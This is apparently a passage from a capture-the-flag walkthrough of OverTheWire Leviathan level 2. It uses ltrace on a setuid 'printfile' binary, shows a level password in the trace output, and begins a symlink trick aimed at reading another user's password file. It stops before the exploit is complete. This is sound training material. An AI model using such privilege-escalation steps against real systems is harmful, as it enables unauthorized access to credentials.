**`leviathan2@gibson:~$ ls`**  
*`printfile`*  

Another setuid binary. 

**`leviathan2@gibson:~$ ./printfile`**  
```
*** File Printer ***
Usage: ./printfile filename
```
**`leviathan2@gibson:~$ ls -la`**  
```
total 36
drwxr-xr-x  2 root       root        4096 Dec  3 08:13 .
drwxr-xr-x 83 root       root        4096 Dec  3 08:14 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Dec  3 08:13 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
```
**`leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3`**   
*`You cant have that file...`*  

Well that's odd; it won't let us print the contents of the leviathan3 password file, despite the binary having ownership permissions of `leviathan3`. Let's see what's going on under the hood:

**`leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3`**  
```
__libc_start_main(0x80491e6, 2, 0xffffd5d4, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                                                                        = -1
puts("You cant have that file..."You cant have that file...
)                                                                                                                 = 27
+++ exited (status 1) +++
```

Well that's strange; it doesn't seem to be calling any libraries, rather just automatically printing that I don't have access. It doesn't make sense that this would be the case for all files, otherwise the setuid binary would essentially be useless. Let's try with another file:

**`leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2`**  
```
__libc_start_main(0x80491e6, 2, 0xffffd5d4, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                                                                                                        = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                                              = 39
geteuid()                                                                                                                                          = 12002
geteuid()                                                                                                                                          = 12002
setreuid(12002, 12002)                                                                                                                             = 0
system("/bin/cat /etc/leviathan_pass/lev"...mEh5PNl10e
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                             = 0
+++ exited (status 0) +++
```

Well here we go; it makes dynamic library calls for other input files, just not for /etc/leviathan_pass/leviathan3. Perhaps it is conditionally programmed such that for that exact file, it prints the "can't have that file" output. To exploit this, we need to reference another filename in the binary input, while at the same time, actually reading the contents of our intended target file. We can create a symbolic link for this purpose:

**`leviathan2@gibson:~$ mkdir /tmp/rajh/`**  
**`leviathan2@gibson:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/rajh/test.txt`**  
